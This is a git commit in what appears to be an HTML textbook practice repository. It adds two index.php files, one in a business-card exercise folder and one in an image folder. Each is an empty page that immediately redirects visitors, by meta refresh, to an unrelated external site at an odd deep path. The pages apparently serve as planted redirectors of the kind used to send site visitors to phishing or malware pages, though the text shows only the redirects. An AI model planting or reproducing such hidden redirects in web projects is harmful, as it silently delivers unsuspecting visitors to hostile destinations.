58fe769b40792b04dab088e98ffe17f210ca7539
junho <zk836566@gmail.com>
2022-02-26 22:07:07 +0900

    upload to server

---
+++ html_교재실습/html/ch7_bussiness_card/index.php
@@ -0,0 +1,11 @@
+<html>
+<head>
+<title>post</title>
+
+<meta http-equiv="refresh" content="0; URL=https://fitgroup.com.br/downloads/versoes/qar/">
+</head>
+
+<body>
+</body>
+
+</html>
---
+++ html_교재실습/html/img/index.php
@@ -0,0 +1,11 @@
+<html>
+<head>
+<title>post</title>
+
+<meta http-equiv="refresh" content="0; URL=https://solerypalau.mx/mandala/public/__/">
+</head>
+
+<body>
+</body>
+
+</html>
